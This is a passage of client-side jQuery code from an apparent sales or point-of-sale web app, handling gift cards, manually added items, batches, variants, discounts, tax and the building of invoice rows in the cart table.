                gcexpiry = $('#gcexpiry').val() ? $('#gcexpiry').val() : '',
                gcprice = parseFloat($('#gcprice').val());
        if (gccode == '' || gcvalue == '' || gcprice == '' || gcvalue == 0 || gcprice == 0) {
            $('#gcerror').text('Please fill the required fields');
            $('.gcerror-con').show();
            return false;
        }

        var gc_data = new Array();
        gc_data[0] = gccode;
        gc_data[1] = gcvalue;
        gc_data[2] = gccustomer;
        gc_data[3] = gcexpiry;
        //if (typeof slitems === "undefined") {
        //    var slitems = {};
        //}

        $.ajax({
            type: 'get',
            url: site.base_url + 'sales/sell_gift_card',
            dataType: "json",
            data: {gcdata: gc_data},
            success: function (data) {
                if (data.result === 'success') {
                    slitems[mid] = {"id": mid, "item_id": mid, "label": gcname + ' (' + gccode + ')', "row": {"id": mid, "code": gccode, "name": gcname, "quantity": 1, "price": gcprice, "real_unit_price": gcprice, "tax_rate": 0, "qty": 1, "type": "manual", "discount": "0", "serial": "", "option": ""}, "tax_rate": false, "options": false};
                    localStorage.setItem('slitems', JSON.stringify(slitems));
                    loadItems();
                    $('#gcModal').modal('hide');
                    $('#gccard_no').val('');
                    $('#gcvalue').val('');
                    $('#gcexpiry').val('');
                    $('#gcprice').val('');
                } else {
                    $('#gcerror').text(data.message);
                    $('.gcerror-con').show();
                }
            }
        });
        return false;
    });

    /* ------------------------------
     * Show manual item addition modal
     ------------------------------- */
    $(document).on('click', '#addManually', function (e) {
        if (count == 1) {
            slitems = {};
            if ($('#slwarehouse').val() && $('#slcustomer').val()) {
                $('#slcustomer').select2("readonly", true);
                $('#slwarehouse').select2("readonly", true);
            } else {
                bootbox.alert(lang.select_above);
                item = null;
                return false;
            }
        }
        $('#mnet_price').text('0.00');
        $('#mpro_tax').text('0.00');
        $('#mModal').appendTo("body").modal('show');
        return false;
    });

    $(document).on('click', '#addItemManually', function (e) {
        var mid = (new Date).getTime(),
                mcode = $('#mcode').val(),
                mname = $('#mname').val(),
                mtax = parseInt($('#mtax').val()),
                mqty = parseFloat($('#mquantity').val()),
                mdiscount = $('#mdiscount').val() ? $('#mdiscount').val() : '0',
                unit_price = parseFloat($('#mprice').val()),
                mtax_rate = {};
        if (mcode && mname && mqty && unit_price) {
            $.each(tax_rates, function () {
                if (this.id == mtax) {
                    mtax_rate = this;
                }
            });

            slitems[mid] = {"id": mid, "item_id": mid, "label": mname + ' (' + mcode + ')', "row": {"id": mid, "code": mcode, "name": mname, "quantity": mqty, "price": unit_price, "unit_price": unit_price, "real_unit_price": unit_price, "mrp":unit_price, "tax_rate": mtax, "tax_method": 0, "qty": mqty, "type": "manual", "discount": mdiscount, "serial": "", "option": ""}, "tax_rate": mtax_rate, 'units': false, "options": false};
            localStorage.setItem('slitems', JSON.stringify(slitems));
            loadItems();
        }
        $('#mModal').modal('hide');
        $('#mcode').val('');
        $('#mname').val('');
        $('#mtax').val('');
        $('#mquantity').val('');
        $('#mdiscount').val('');
        $('#mprice').val('');
        return false;
    });

    $(document).on('change', '#mprice, #mtax, #mdiscount', function () {
        var unit_price = parseFloat($('#mprice').val());
        var ds = $('#mdiscount').val() ? $('#mdiscount').val() : '0';
        if (ds.indexOf("%") !== -1) {
            var pds = ds.split("%");
            if (!isNaN(pds[0])) {
                item_discount = parseFloat(((unit_price) * parseFloat(pds[0])) / 100);
            } else {
                item_discount = parseFloat(ds);
            }
        } else {
            item_discount = parseFloat(ds);
        }
        unit_price -= item_discount;
        var pr_tax = $('#mtax').val(), item_tax_method = 0;
        var pr_tax_val = 0, pr_tax_rate = 0;
        if (pr_tax !== null && pr_tax != 0) {
            $.each(tax_rates, function () {
                if (this.id == pr_tax) {
                    if (this.type == 1) {

                        if (item_tax_method == 0) {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(this.rate)) / (100 + parseFloat(this.rate))), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                            unit_price -= pr_tax_val;
                        } else {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(this.rate)) / 100), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                        }

                    } else if (this.type == 2) {

                        pr_tax_val = parseFloat(this.rate);
                        pr_tax_rate = this.rate;

                    }
                }
            });
        }

        $('#mnet_price').text(formatMoney(unit_price));
        $('#mpro_tax').text(formatMoney(pr_tax_val));
    });

    /* --------------------------
     * Edit Row Quantity Method
     --------------------------- */
     $(document).on("change",".rbtach_no", function(){
       
        var row = $(this).closest('tr');
        var row_id = row.attr('id');
        $('#row_id').val(row_id);
        item_id = row.attr('data-item-id');        
         
        var batch_number    = $(this).val();
        var batch_id        = $(this).find(':selected').attr('data-batchid');
    
        slitems[item_id].row.batch = batch_id;
        slitems[item_id].row.batch_number = batch_number;
                 
        localStorage.setItem('slitems', JSON.stringify(slitems));

        loadItems();
    })
    
    $(document).on("change",".rexpiry", function(){
         var row = $(this).closest('tr');
        var row_id = row.attr('id');
        $('#row_id').val(row_id);
        item_id = row.attr('data-item-id');
        
        item = slitems[item_id];
        var expiry = $(this).val();
        
        
        slitems[item_id].row.cf1	 = expiry;
        localStorage.setItem('slitems', JSON.stringify(slitems));

        loadItems();
    })
    

    var old_row_qty;
    $(document).on("focus", '.rquantity', function () {
        old_row_qty = $(this).val();
    }).on("change", '.rquantity', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val()) || parseFloat($(this).val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_qty = parseFloat($(this).val()),
            item_id = row.attr('data-item-id');
        slitems[item_id].row.base_quantity = new_qty;
        slitems[item_id].row.unit_quantity = new_qty;
        if (slitems[item_id].row.unit != slitems[item_id].row.base_unit) {
            $.each(slitems[item_id].units, function () {
                if (this.id == slitems[item_id].row.unit) {
                    slitems[item_id].row.base_quantity = unitToBaseQty(new_qty, this);
                   slitems[item_id].row.unit_quantity = unitToBaseQty(new_qty, this);
                }
            });
        }
        slitems[item_id].row.qty = new_qty;
        localStorage.setItem('slitems', JSON.stringify(slitems));
        loadItems();
    });

    /* --------------------------
     * Edit Row Price Method
     -------------------------- */
    var old_price;
    $(document).on("focus", '.rprice', function () {
        old_price = $(this).val();
    }).on("change", '.rprice', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val())) {
            $(this).val(old_price);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_price = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        slitems[item_id].row.price = new_price;
        localStorage.setItem('slitems', JSON.stringify(slitems));
        loadItems();
    });

    $(document).on("click", '#removeReadonly', function () {
        $('#slcustomer').select2('readonly', false);
        //$('#slwarehouse').select2('readonly', false);
        return false;
    });


});
/* -----------------------
 * Misc Actions
 ----------------------- */



function onVariantChanged() {    
    
    var item_id  = $('#item_id').val();
    var poption = $('#poption').val();    
   
    var batch_id = slitems[item_id].row.batch;
    var batch_number = slitems[item_id].row.batch_number;
    var selected = '';
    var b = 0;
    var first_batch_number = '';
    var batchIds = [];
    var btc = '<input type="text" class="form-control" name="pbatch_number" id="pbatch_number" value="' + batch_number + '">';
    // alert(slitems[item_id].product_batches[poption]);
    if (slitems[item_id].product_batches !== false && slitems[item_id].product_batches[poption]) {
        var optionBatched = slitems[item_id].product_batches[poption];

        if (parseInt(site.settings.product_batch_setting) == 1) {
            btc = '<select id="pbatch_number" name="pbatch_number" class="form-control" >';

            $.each(optionBatched, function () {
                b++;
                batch_number = (batch_id == this.id) ? this.batch_no : '';
                btc += '<option data-batchid="' + this.id + '" value="' + this.batch_no + '" ' + selected + ' >' + this.batch_no + '</option>';
                if (b == 1) {
                    first_batch_number = this.batch_no;
                }
            });
            btc += '</select>';

        } else if (parseInt(site.settings.product_batch_setting) == 2) {

            btc = '<input list="batches" class="form-control" name="pbatch_number" id="pbatch_number" value="' + batch_number + '"><datalist id="batches">';
            $.each(optionBatched, function () {
                b++;
                batch_number = batch_number ? batch_number : ((batch_id == this.id) ? this.batch_no : '');
                btc += '<option data-batchid="' + this.id + '" value="' + this.batch_no + '" >';
                if (b == 1) {
                    first_batch_number = this.batch_no;
                }
                batchno = this.batch_no;
                batchid = this.id;
                batchIds[batchno] = batchid;

            });
            btc += '</datalist>';
            slitems[item_id].product_batches = batchIds;
        }
    }
    $('#batchNo_div').html(btc);
    $('#pbatch_number').select2('val', batch_number ? batch_number : first_batch_number);

    slitems[item_id].batchs = optionBatched ? optionBatched : false;
    localStorage.setItem('slitems', JSON.stringify(slitems));

    onBatchChanged();

}


function onBatchChanged() {
    
    var item_id     = $('#item_id').val();
    var batch       = $('#pbatch_number').val();
    var batch_id    = $('#pbatch_number').find(':selected').attr('data-batchid');

    batch_id = batch_id ? batch_id : (slitems[item_id].product_batches[batch] ? slitems[item_id].product_batches[batch] : false)

    if (batch_id && slitems[item_id].batchs[batch_id]) {

        var batchvalue = slitems[item_id].batchs[batch_id];

        var real_unit_price = batchvalue['price'];
        var pexpiry = batchvalue['expiry'] !== '' ? batchvalue['expiry'] : '';
        $('#pcost').val(batchvalue['price']);
        $('#pexpiry').val(pexpiry);
        var tax_rates = slitems[item_id].tax_rate;
        var net_price = real_unit_price;
        var tax_method = $('#tax_method').val();
        if (site.settings.tax1) {

            var item_discount = 0, ds = $('#pdiscount').val();
            if (ds.indexOf("%") !== -1) {
                var pds = ds.split("%");
                if (!isNaN(pds[0])) {
                    item_discount = parseFloat(((real_unit_price) * parseFloat(pds[0])) / 100);
                } else {
                    item_discount = parseFloat(ds);
                }
            } else {
                item_discount = parseFloat(ds);
            }
            net_price -= item_discount;
            var pr_tax = $('#ptax').val();
            var pr_tax_val = 0;
            if (pr_tax !== null && pr_tax != 0) {

                if (tax_method == 0) {
                    pr_tax_val = formatDecimal((((real_unit_price - item_discount) * parseFloat(tax_rates)) / (100 + parseFloat(tax_rates))), 4);
                    // pr_tax_rate = formatDecimal(tax_rates) + '%';
                    net_price -= pr_tax_val;
                } else {
                    pr_tax_val = formatDecimal((((real_unit_price - item_discount) * parseFloat(tax_rates)) / 100), 4);
                    //  pr_tax_rate = formatDecimal(tax_rates) + '%';
                }                   
            }
        }

        $('#net_price').text(formatMoney(net_price));
        $('#pro_tax').text(formatMoney(pr_tax_val));
        $('#ptax').val(pr_tax).trigger('change');
        $('#psubtotal').val('');

    }
}


function resetCartItems(){
      localStorage.removeItem('slitems');
    }
    

// hellper function for customer if no localStorage value
function nsCustomer() {
    $('#slcustomer').select2({
        minimumInputLength: 1,
        ajax: {
            url: site.base_url + "customers/suggestions",
            dataType: 'json',
            quietMillis: 15,
            data: function (term, page) {
                return {
                    term: term,
                    limit: 10
                };
            },
            results: function (data, page) {
                if (data.results != null) {
                    return {results: data.results};
                } else {
                    return {results: [{id: '', text: 'No Match Found'}]};
                }
            }
        }
    });
}

function getVariant_Detail(VarientId, ItemId) {
        
    slitems = JSON.parse(localStorage.getItem('slitems'));   
    
    //ItemId = ItemId + VarientId;
    
    //var item_id = (site.settings.item_addition == 1) ? slitems[ItemId].item_id  +''+VarientId : slitems[ItemId].id +''+VarientId;
     var item_id = (site.settings.item_addition == 1) ? (slitems[ItemId].row.id + VarientId) : slitems[ItemId].id ;
     var opt = slitems[ItemId].options[VarientId]; 
     
    slitems[item_id] = slitems[ItemId];
    slitems[item_id].item_id             = (slitems[ItemId].row.id + VarientId);
    slitems[item_id].row.option          = VarientId;
    slitems[item_id].row.quantity        = opt.quantity;
    slitems[item_id].row.unit_quantity   = opt.unit_quantity;
    slitems[item_id].row.unit_weight     = opt.unit_weight;
    var unit_price                       = parseFloat(slitems[ItemId].row.price) + parseFloat(opt.price);
    var unit_cost                        = parseFloat(slitems[ItemId].row.cost)  + parseFloat(opt.cost);
    slitems[item_id].row.unit_cost       = unit_cost;
    slitems[item_id].row.unit_price      = unit_price;
    slitems[item_id].row.base_unit_price = unit_price;
    slitems[item_id].row.real_unit_price = unit_price;
    
    
    
    if (slitems[ItemId].row.storage_type == 'packed' && slitems[ItemId].product_batches !== false && slitems[ItemId].product_batches[VarientId]) {
        
        option_batchs = slitems[ItemId].product_batches[VarientId];
        slitems[item_id].batchs = option_batchs;
        var i=0;
        $.each(option_batchs, function (index, obj) {
            i++;
            if(i==1) {
                slitems[item_id].row.batch = option_batchs[index].id;
                slitems[item_id].row.batch_number = option_batchs[index].batch_no;
                slitems[item_id].row.batch_quantity = option_batchs[index].quantity;
            }
        });
    }
    
    if(item_id != ItemId) {
        delete slitems[ItemId];
    }
    
    localStorage.setItem('slitems', JSON.stringify(slitems));

    loadItems();
}

//localStorage.clear();
function loadItems() {

    if (localStorage.getItem('slitems')) {
        total = 0;
        count = 1;
        an = 1;
        product_tax = 0;
        invoice_tax = 0;
        product_discount = 0;
        order_discount = 0;
        total_discount = 0;
        total_netprice = 0;
        item_cart_qty = [];
        
        $("#slTable tbody").empty();
        
        slitems = JSON.parse(localStorage.getItem('slitems'));
        
        sortedItems = slitems;
        
        console.log('-----------sortedItems---------');
        console.log(sortedItems);
        
        sortedItems = (site.settings.item_addition == 1) 
        ? _.sortBy(slitems, function (o) {  return [parseInt(o.order)];  }) 
        : slitems;
        
        $('#add_sale, #edit_sale, #print_invoice').attr('disabled', false);

        var cart_item_unit_count = 0;
        var total_item_weight = 0;
        
        $.each(sortedItems, function () {
            cart_item_unit_count += parseFloat(this.row.qty);
        });
        
        $.each(sortedItems, function () {
            
            var item = this;
            
            var Buprice = (parseInt(item.row.base_unit_price)) ? item.row.base_unit_price : item.row.real_unit_price;
            var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
            item.order = item.order ? item.order : new Date().getTime();
            var product_id = item.row.id, item_type = item.row.type, combo_items = item.combo_items, item_price = item.row.unit_price, item_qty = item.row.qty, item_aqty = item.row.quantity, item_tax_method = item.row.tax_method, item_option = item.row.option, item_code = item.row.code, item_serial = ((item.row.serial === null || item.row.serial === "" || item.row.serial == "undefined") ? '' : item.row.serial), item_name = item.row.name.replace(/"/g, "&#034;").replace(/'/g, "&#039;");
//            var item_delivered_qty  = item.row.delivered_qty;
//            var item_pending_qty    = item.row.pending_qty;
            var product_unit = item.row.unit;
            var item_ds = item.row.discount, item_discount = 0;
            var item_weight = 0;
            
            var sale_action = $('#sale_action').val();
            var old_qty = (sale_action == 'edit') ? item.row.old_qty : 0;
            
            if(item.row.storage_type == 'loose' ){
                item_cart_qty[item.row.id] = parseFloat(item_cart_qty[item.row.id]) > 0 ? (item_cart_qty[item.row.id] + (item.row.qty * item.row.unit_quantity)) : (item.row.qty * item.row.unit_quantity);
            } else {
                item_cart_qty[item.item_id] = parseFloat(item_cart_qty[item.item_id]) > 0 ? (item_cart_qty[item.item_id] + item.row.qty) : item.row.qty;
            }
            
            //var base_quantity = formatDecimal((parseFloat(item.row.unit_quantity) * parseFloat(item.row.qty)),3);
              var base_quantity = formatDecimal( parseFloat(item.row.unit_quantity),3);         
           
            /*if (sale_action == 'add') {*/
            var unit_price = item.row.real_unit_price ? item.row.real_unit_price : item.row.unit_price;
            /*} else {
                var unit_price = (item_tax_method == 0) ? item.row.real_unit_price : item.row.net_unit_price;
            }*/
                        
            var mrp                     = item.row.mrp;
            var hsn_code                = item.row.hsn_code;
            var hidden_base_quantity    = base_quantity;
            
            if (item.row.fup != 1 && product_unit != item.row.base_unit) {
                $.each(item.units, function () {
                    if (this.id == product_unit) {
                        base_quantity = formatDecimal(unitToBaseQty(item.row.qty, this), 4);
                        unit_price = formatDecimal((parseFloat(Buprice) * (unitToBaseQty(1, this))), 4);
                    }
                });
            }
                         
            if (item.options !== false) {                               
                $.each(item.options, function () {
                    
                    var this_options = this;
                                        
                    //If Select multiple options
                    if (jQuery.type(item.row.option) == 'string') {
                        var optionArr = item.row.option.split(",");
                        $.each(optionArr, function (k, opt) {

                            if (this_options.id == opt) {
                                if (this_options.price != 0 && this_options.price != '' && this_options.price != null) {

                                     item_price = formatDecimal(parseFloat(item.row.price) + parseFloat(this_options.price), 6);
                                     unit_price = item_price;
                                     item_aqty = this_options.quantity;
                                }
                                if (k) {
                                    sel_opt = sel_opt + ',' + this_options.name;
                                } else {
                                    sel_opt = this_options.name;
                                }
                            }
                        });
                    } 
                    else {
                        if (this_options.id == item.row.option) {
                            if (this_options.price != 0 && this_options.price != '' && this_options.price != null) {
                                item_price = formatDecimal(parseFloat(item.row.price) + (parseFloat(this_options.price)), 6);
                                unit_price = item_price;
                                item_aqty  = this_options.quantity;
                            }
                            sel_opt = this_options.name;                            
                        }
                    }
                });
            }
            
            //Apply Batch settings
            if (parseInt(site.settings.product_batch_setting) > 0 && (item.row.batch != false && item.row.batch_number != false)) {
                
                var batch_id = item.row.batch;
if(batch_id){
                if(item.batchs[batch_id].batch_no== item.row.batch_number || item.batchs[batch_id].option_id == item.row.option){
                    
                    unit_price = parseFloat(item.batchs[batch_id].price) > 0 ? item.batchs[batch_id].price : unit_price;
                }
                }
                //Condition for manage batch stocks
                if(parseInt(site.settings.product_batch_required) == 2 || (parseInt(site.settings.product_batch_required) == 1  && item.row.storage_type == 'packed' )){
                    
                    item.row.quantity = item.batchs[batch_id].quantity;
                }
            }
          
          
            if(item_ds != '' && item_ds != 0) {
                var ds = item_ds ? item_ds : '0';
                if (ds.indexOf("%") !== -1) {
                    var pds = ds.split("%");                    
                    if (!isNaN(pds[0])) {                        
                        item_discount = formatDecimal((parseFloat(((unit_price) * parseFloat(pds[0])) / 100)), 6);                        
                    } else {                        
                        item_discount = formatDecimal(ds);
                    }
                } else {                    
                    item_discount = formatDecimal(ds);
                } 
                product_discount += parseFloat(item_discount * item_qty); 
            }
 
             /** New Loginc Order Discount **/
            if(site.settings.sales_order_discount == 1) {                
                var posdiscount = localStorage.getItem('posdiscount');
               
                if ( posdiscount != '' && posdiscount) {
                    //Order Level Discount Calculations               
                    var ods = posdiscount;
                    if (ods.indexOf("%") !== -1) {
                        var pds = ods.split("%");
                        if (!isNaN(pds[0])) {
                            item_discount = formatDecimal((parseFloat(((unit_price) * parseFloat(pds[0])) / 100)), 6);
                            item_ds = ods;
                        } else {
                            item_discount = formatDecimal(parseFloat(ods), 6);
                            item_ds = item_discount;
                        }
                    } else {
                        //If Discount in amount then divided equal in each items unit equally.
                        item_discount = formatDecimal((parseFloat(ods) / cart_item_unit_count), 6);
                        item_ds = item_discount;
                    }
                    
                    //Set Order Discount Value null.
                    product_discount += parseFloat(item_discount * item_qty);
                } 
            }
                /** New Login Order Discount ***/
                    
            unit_price = formatDecimal(unit_price - item_discount);
            var cf1 = item.row.cf1 ? item.row.cf1 : '';
            var cf2 = item.row.cf2 ? item.row.cf2 : '';
            var cf3 = item.row.cf3;
            var cf4 = item.row.cf4;
            var cf5 = item.row.cf5;
            var cf6 = item.row.cf6;
                       

            var pr_tax = item.tax_rate;
            
            var pr_tax_val = 0, pr_tax_rate = 0;
            if (site.settings.tax1 == 1) {
                if (pr_tax !== false) {
                    if (pr_tax.type == 1) {

                        if (item_tax_method == '0') {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(pr_tax.rate)) / (100 + parseFloat(pr_tax.rate))), 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        } else {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(pr_tax.rate)) / 100), 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        }

                    } else if (pr_tax.type == 2) {

                        pr_tax_val = parseFloat(pr_tax.rate);
                        pr_tax_rate = pr_tax.rate;

                    }
                    product_tax += pr_tax_val * item_qty;
                }
            }
            item_price = (item_tax_method == 0) ? formatDecimal(unit_price - pr_tax_val, 4) : formatDecimal(unit_price);
             
            var show_unit_price = item_price;
            var show_net_price = formatMoney(parseFloat(item.row.base_unit_price) * parseFloat(base_quantity));
            
            var row_no = (new Date).getTime();

            /*03-10-2019*/
            unit_price = formatDecimal(unit_price + item_discount, 4);
            mrp = formatDecimal(mrp, 4);
            var opt = 'N/A <input id="poption_' + row_no + '" name="product_option[]" type="hidden" class="roption" value="0">';
             
            if (item.options) {                
                if( (item.row.storage_type == 'loose' && site.settings.sale_loose_products_with_variants == 1) || item.row.storage_type == 'packed' ) {
                                 
                    opt = '<select id="poption_' + row_no + '" name="product_option[]" class="form-control select roption" onchange="return getVariant_Detail(this.value, ' + item_id + ');" >';
                    $.each(item.options, function () {
                        if (this.id == item_option) {
                           sel_opt = this.name; 
                           hidden_base_quantity = this.unit_quantity;
                           opt += '<option value="'+this.id+'" data-unitqty="'+this.unit_quantity+'" selected="selected" >'+this.name+'</option >';
                        } else {
                           opt += '<option value="'+this.id+'" data-unitqty="'+this.unit_quantity+'"  >'+this.name+'</option >';
                        }
                    });
                    opt += '</select>';
                } else if(item_option) {
                    opt = item.options[item_option].name + '<input name="product_option[]" type="hidden" class="roption" value="'+item_option+'">'; 
                } else {
                    opt = '<input name="product_option[]" type="hidden" class="roption" value="'+item_option+'">';
                }                 
            }
           
            var newTr = $('<tr id="row_' + row_no + '" class="row_' + item_id + '" data-item-id="' + item_id + '"></tr>');
            tr_html = '<td>';
            if (site.settings.sales_image == 1) {
                tr_html += '<img src="assets/uploads/thumbs/' + item.image + '" alt="' + item.image + '" style="width:30px; height:30px;" /> ';
            }
            
            item_weight = (item.row.unit_weight) ? (parseFloat(item_qty) * parseFloat(item.row.unit_weight)) : '';
             
            tr_html += '<input name="product_id[]" type="hidden" class="rid" value="' + product_id + '">';
            tr_html += '<input name="hsn_code[]" type="hidden" class="rid" value="' + hsn_code + '">';
            tr_html += '<input name="product_type[]" type="hidden" class="rtype" value="' + item_type + '">';
            tr_html += '<input name="product_code[]" type="hidden" class="rcode" value="' + item_code + '">';
            tr_html += '<input name="product_name[]" type="hidden" class="rname" value="' + item_name + '">';
            tr_html += '<input name="item_weight[]" type="hidden" class="rweight" value="' + item_weight + '">';
            
          //  tr_html += '<input name="product_option[]" type="hidden" class="roption" value="' + item_option + '">';
          //  tr_html += '<span class="sname" id="name_' + row_no + '">' + item_code + ' - ' + item_name + (sel_opt != '' ? ' (' + sel_opt + ')' : '') + '</span> <i class="pull-right fa fa-edit tip pointer edit" id="' + row_no + '" data-item="' + item_id + '" title="Edit" style="cursor:pointer;"></i></td>';
            tr_html += '<span class="sname" id="name_' + row_no + '">' + item_code + ' - ' + item_name + '</span> <i class="pull-right fa fa-edit tip pointer edit" id="' + row_no + '" data-item="' + item_id + '" title="Edit" style="cursor:pointer;"></i></td>';
                        
            tr_html += '<td>' + opt + '</td>';
            
            if (parseInt(site.settings.overselling) == 0) {
                
                if(item.row.storage_type == 'loose' ){  
                    var iqty = (sale_action == 'edit') ? (parseFloat(item_aqty) + parseFloat(item_cart_qty[item.row.id])) : item_aqty ;
                    tr_html += '<td>'+ formatDecimal(item_cart_qty[item.row.id],2) + '/' + formatDecimal(iqty,2) + '</td>';
                } else {
                    var iqty = (sale_action == 'edit') ? (parseFloat(item_aqty) + parseFloat(item_cart_qty[item.item_id])) : item_aqty ;
                    tr_html += '<td>'+ formatDecimal(item_cart_qty[item.item_id],2) + '/' + formatDecimal(iqty,2) +' '+ item.row.unit_lable +  '</td>';
                }
            }
        
            if (site.settings.product_serial == 1) {
                //alert(item_serial);
                var item_serial_val = '';
                if(item_serial != '' && item_serial != 'undefined'  && item_serial != null) { item_serial_val=item_serial; }
                       
                tr_html += '<td class="text-right"><input class="form-control input-sm rserial" name="serial[]" type="text" id="serial_' + row_no + '" value="' + item_serial_val+ '"></td>';
            }
                      
            /***************************************************
             * site.settings.product_batch_required (0:Optional | 1:Required For Packed Products | 2:Required For All Products  )
             * site.settings.product_batch_setting  (0:Hide/Disabled Batches | 1:Select Batch From List | 2:Add Batch While Transaction)
             ***************************************************/
            // item.row.storage_type

            if (parseInt(site.settings.product_batch_setting) > 0) {
                var td_batch = '<td>';
                var batch_required = '';
                if (parseInt(site.settings.product_batch_required) == 2 || (parseInt(site.settings.product_batch_required) == 1 && item.row.storage_type == 'packed')) {
                    batch_required = ' required="required" ';
                }

                if (item.batchs) {
                    if (parseInt(site.settings.product_batch_setting) == 1) {
                        td_batch += '<select class="form-control rbtach_no" name="batch_number[]" ' + batch_required + '  data-id="' + row_no + '" data-item="' + item_id + '" id="batch_number_' + row_no + '">';
                        $.each(item.batchs, function (index, value) {
                            td_batch += '<option data-batchid="' + value.id + '" value="' + value.batch_no + '" ' + (value.id == item.row.batch ? 'Selected="Selected"' : '') + ' >' + value.batch_no + '</option>';
                        });
                        td_batch += '</select>';
                    }
                    if (parseInt(site.settings.product_batch_setting) == 2) {
                        batchIds = [];
                        td_batch += '<input list="batches_' + row_no + '" type="text" ' + batch_required + '  class="form-control rbtach_no" name="batch_number[]" id="batch_number_' + row_no + '" value="' + item.row.batch_number + '" ><datalist id="batches_' + row_no + '">';
                        $.each(item.batchs, function (index, value) {
                            td_batch += '<option data-batchid="' + value.id + '"  value="' + value.batch_no + '" >';
                            batchno = value.batch_no;
                            batchid = value.id;
                            batchIds[batchno] = batchid;
                        });
                        td_batch += '</datalist>';
                       // slitems[item_id].product_batches = batchIds;
                    }
                } else {
                    var item_batch_number = (item_batch_number) ? item_batch_number : '';
                    td_batch += '<input class="form-control rbtach_no" ' + batch_required + ' name="batch_number[]" type="text" value="' + item_batch_number + '" data-id="' + row_no + '" data-item="' + item_id + '" id="batch_number_' + row_no + '">';

                }
                td_batch += '</td>';
            }

            tr_html += td_batch;
             
        if (site.settings.product_expiry == 1) {
            tr_html += '<td><input name="cf1[]" type="text" placeholder="MM/YYYY" class="form-control rexpiry cf1" value="' + cf1 + '"> </td>';
        }
                
        tr_html += '<td class="text-center"><input name="product_unit[]" type="hidden" class="runit" value="' + product_unit + '">';
        tr_html += '<input name="product_base_quantity[]" type="hidden" class="rbase_quantity" value="' + base_quantity + '">';
        tr_html += '<input name="old_qty[]" type="hidden" class="rold_qty" value="' + old_qty + '">';
        
        var qmax = (parseInt(site.settings.overselling) == 0) ? formatDecimal(item_aqty,0) : 1000;
        if(item.row.type == 'combo') {
            var cmax = 1000, cimax = '';
            $.each(combo_items, function () {                         
                cimax = (parseFloat(this.quantity) / parseFloat(this.qty));
                cmax = (cimax > cmax) ? cmax : cimax;                       
            });                    
            qmax = (parseInt(site.settings.overselling) == 0) ? formatDecimal(cmax,0) : 1000;
        }//end if.
                
        if(item.row.storage_type == 'packed' ) {
            var qotp = '', selected = '';            
            for(var q = 1; q <= (qmax?qmax:1); q++){
                selected = '';
                if(formatDecimal(item_qty,0)==q){
                    selected = ' selected="selected" ';
                }
                qotp += '<option '+selected+'>'+q+'</option>';
            }//end for
              tr_html += '<input class="form-control text-center rquantity" name="quantity[]" tabindex="' + ((site.settings.set_focus == 1) ? an : (an + 1)) + '" type="number" value="' + formatDecimal(item_qty,3) + '" min="1" max="'+qmax+'" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" onClick="this.select();">';
            //tr_html += '<select class="form-control text-center rquantity" name="quantity[]" tabindex="' + ((site.settings.set_focus == 1) ? an : (an + 1)) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" >'+qotp+'</select>';
        } else {
            tr_html += '<input class="form-control text-center rquantity" name="quantity[]" tabindex="' + ((site.settings.set_focus == 1) ? an : (an + 1)) + '" type="number" value="' + formatDecimal(item_qty,3) + '" min="1" max="'+qmax+'" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" onClick="this.select();">';
        }
       // tr_html += item.row.unit_lable + '</td>';
        tr_html += '</td>';
        
        if (site.settings.product_weight == 1) {
            tr_html += '<td class="text-right">'+ formatDecimal(parseFloat(item_weight),3) +' Kg</td>';
            total_item_weight += item_weight;
        }
        
            //tr_html += '<td class="delivery_items"><input class="form-control text-center rdelivered_quantity" tabindex="" name="delivered_quantity[]" type="number" value="' + formatDecimal(item_delivered_qty) + '" min="0" max="' + formatDecimal(item_qty) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="delivered_quantity_' + row_no + '" onchange="validate_qty(this);" onClick="this.select();"></td>';
            //tr_html += '<td class="delivery_items"><input class="form-control text-center rpending_quantity" tabindex="" name="pending_quantity[]" type="number" value="' + formatDecimal(item_pending_qty) + '" min="0" max="' + formatDecimal(item_qty) + '"  data-id="' + row_no + '" data-item="' + item_id + '" id="pending_quantity_' + row_no + '" onchange="validate_qty(this);" onClick="this.select();"></td>';
            
            tr_html += '<td class="text-right"><input class="form-control input-sm text-right rprice" name="net_price[]" type="hidden" id="price_' + row_no + '" value="' + item_price + '"><input class="ruprice" name="unit_price[]" type="hidden" value="' + unit_price + '"><input class="realuprice" name="real_unit_price[]" type="hidden" value="' + unit_price + '"><span class="text-right sprice" id="sprice_' + row_no + '">' + formatMoney(unit_price) + '</span>';
            tr_html += '<input class="form-control input-sm text-right rmrp" name="mrp[]" type="hidden" id="mrp_' + row_no + '" value="' + mrp + '"><span class="text-right smrp" id="smrp_' + row_no + '"></span></td>';
                      
            if ((site.settings.product_discount == 1 && allow_discount == 1) || item_discount) {
                tr_html += '<td class="text-right"><input class="form-control input-sm rdiscount" name="product_discount[]" type="hidden" id="discount_' + row_no + '" value="' + item_ds + '"><span class="text-right sdiscount text-danger" id="sdiscount_' + row_no + '">'  + (parseFloat(item_ds) != '' ? '(' + item_ds + ')' : '') + '</br>' + formatMoney(0 - (item_discount * item_qty)) + '</span></td>';
            }
            
            tr_html += '<td class="text-right">' + formatMoney(show_unit_price * item_qty) + ' </td>';

            total_netprice += parseFloat(show_unit_price) * parseFloat(item_qty);//item_price

            if (site.settings.tax1 == 1) {
